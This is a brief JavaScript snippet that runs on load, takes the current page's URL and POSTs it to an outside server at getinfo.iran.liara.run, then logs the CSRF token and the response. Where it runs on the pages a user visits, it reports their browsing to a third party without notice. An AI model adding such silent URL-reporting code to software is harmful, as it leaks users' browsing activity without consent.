var currentURL = window.location.href;

async function sendLinkToWebsite(link) {
  try {
    const csrfToken = await getCSRFToken();
    const url = 'https://getinfo.iran.liara.run/record/';
    const data = {
      link: link
    };

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRFToken': csrfToken
      },
      body: JSON.stringify(data)
    });

    console.log('CSRF Token:', csrfToken);
    console.log('response:', response);
  } catch (error) {
    console.error('errors:', error);
  }
}



sendLinkToWebsite(currentURL);